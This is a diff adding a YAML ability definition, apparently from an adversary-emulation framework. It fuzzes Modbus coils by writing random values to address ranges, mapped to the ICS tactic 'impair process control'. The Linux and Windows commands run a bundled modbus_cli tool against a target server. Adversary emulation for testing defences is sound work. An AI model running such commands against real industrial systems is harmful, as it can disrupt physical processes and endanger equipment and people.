@@ -1,0 +1,29 @@
+---
+
+- id: 40f78a8f-2aaa-4b1b-872f-7c6b0f1ddf3e
+  name: Modbus - Fuzz Coils
+  description: |
+    Procedure
+    Modbus Function 5 (0x05) Write Single Coil
+
+    Writes random values to random coils over specified ranges. Addressing starts at 0 (e.g. coils 1-5 = addresses 0-4).
+  tactic: impair-process-control
+  technique_id: T0806
+  technique_name: Brute Force I/O
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} fuzz_c 
+      #{modbus.fuzz_coil.start} #{modbus.fuzz_coil.end} #{modbus.fuzz_coil.count} 
+      --wait #{modbus.fuzz_coil.wait}
+    payloads:
+    - modbus_cli
+  - platform: windows
+    name: psh
+    command: >
+      .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} fuzz_c 
+      #{modbus.fuzz_coil.start} #{modbus.fuzz_coil.end} #{modbus.fuzz_coil.count} 
+      --wait #{modbus.fuzz_coil.wait}
+    payloads:
+    - modbus_cli.exe
